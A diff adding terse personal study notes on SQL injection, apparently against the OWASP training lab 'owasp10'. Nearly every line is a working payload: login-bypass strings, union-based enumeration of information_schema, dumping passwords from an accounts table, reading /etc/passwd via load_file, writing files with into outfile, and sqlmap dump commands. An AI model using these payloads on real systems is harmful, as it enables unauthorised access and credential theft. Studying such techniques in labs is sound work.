@@ -1,0 +1,63 @@
+
+How to login to mysql via terminal
+
+mysql -u root -h targetip;
+show databases;
+use dbname;
+show tables;
+select * from accounts;
+
+------------------------------------------------------------
+
+
+select * from accounts where username = 'test' and password = '$password'
+test' and 1=1 #'
+
+with admin username :
+admin' #
+
+Get option vuln :
+Give this after the name :
+
+name = xxx' order by 1 #
+decode into html language
+%23 for #
+to test order by 100
+find max coloumn
+
+union select 1,2,3,4,5 (replace to order by)
+now try
+union select 1,database(),user(),version(),5
+
+
+target = owasp10
+
+union select,table_name,null,null,5 from information_schema.tables
+
+information_schema is a table created by sql default which stores info about all other db
+
+union select,table_name,null,null,5 from information_schema.tables where table_schema = 'owasp10'
+
+union select 1,column_name,null,null,5 from information_schema.coloumn where table_name = 'accounts'
+
+union select 1,username,password,is_admin,5 from accounts
+
+union select null,load_file('/etc/passwd'),null,null,null
+
+union select null,'example example',null,null,null into outfile '/tmp/example.txt'
+
+sqlmap --help
+sqlmap -u url
+
+use an url copied before
+
+sqlmap -u "copy paste" (-use with help)
+sqlmap -u "copy paste" -dbs
+sqlmap -u "copy paste" --columns -T accounts -D owasp10
+sqlmap -u "copy paste" -T accounts -D owasp10 --dump
+
+
+
+
+
+
